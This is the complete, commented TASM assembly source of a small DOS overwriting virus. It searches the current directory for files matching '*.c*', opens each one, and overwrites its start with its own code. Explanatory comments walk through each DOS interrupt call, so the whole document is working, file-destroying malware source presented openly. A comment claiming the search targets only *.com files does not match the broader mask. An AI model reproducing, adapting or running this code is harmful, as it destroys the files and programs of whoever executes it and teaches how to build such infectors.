.model tiny                         ;Sets memory model for TASM
.radix 16                           ;Sets default number system to hexidecimal (base 16)
.code                               ;starts code section

	org 100                     ;makes program begin at 100h, i.e. a .COM file

start:                              ;beginning label

	mov     ah,4e               ;set ah to 4e, sets function called by int 21
				    ;to find first match
	mov     dx,offset file_mask ;sets search to look for *.com

 search:
	int     21                  ;executes find first match function
	jc      quit                ;if there aren't any files, ends


	mov     ax,3d02             ;open file read/write mode
	mov     dx,9e               ;pointer to name found by findfirst
	int     21

	xchg    ax,bx               ;moves file handle to bx from ax
	mov     ah,40               ;sets ah to write to file function
	mov     cl,[ender-start]    ;overwrites file
	mov     dx,100              ;starting address for coms, write from
	int     21                  ;beginning of virus


	mov     ah,3e
	int     21                  ;closes file handle

	mov     ah,4f
	jmp     short search        ;jumps back set to find next

	quit:
	int     20                  ;ends program

file_mask db    '*.c*',0           ;file mask to match to programs

ender:                              ;label for size calculation

end start                           ;end of code
